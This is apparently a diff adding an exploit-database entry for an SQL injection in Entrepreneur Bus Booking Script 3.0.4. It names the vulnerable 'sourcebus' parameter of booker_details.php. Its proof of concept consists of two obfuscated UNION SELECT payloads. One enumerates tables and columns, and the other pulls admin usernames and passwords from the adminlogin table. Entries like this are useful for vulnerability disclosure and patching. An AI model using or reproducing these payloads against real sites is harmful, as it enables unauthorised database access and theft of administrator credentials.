@@ -1,0 +1,29 @@
+# # # # # 
+# Exploit Title: Entrepreneur Bus Booking Script 3.0.4 - SQL Injection
+# Dork: N/A
+# Date: 10.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/entrepreneur-bus-booking-script/
+# Version: 3.0.4
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/booker_details.php?sourcebus=[SQL]
+# 
+# -1++/*!09999UNION*/+/*!09999SELECT*/+(/*!09999Select*/+export_set(5,@:=0,(/*!09999select*/+count(*)/*!09999from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!09999table_name*/,0x3c6c693e,2),/*!09999column_name*/,0xa3a,2)),@,2))--+-
+# 
+# -1++/*!09999UNION*/+/*!09999SELECT*/+(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)/*!50000FROM*/(adminlogin)/*!50000WHERE*/(@x)IN(@x:=/*!50000CONCAT*/(0x20,@x,0x3c62723e555345524e414d453a,admin_username,0x3c62723e504153533a,admin_password,0x3c62723e564552204159415249,0x3c62723e))))x)--+-
+# 
+# 
+# # # # #
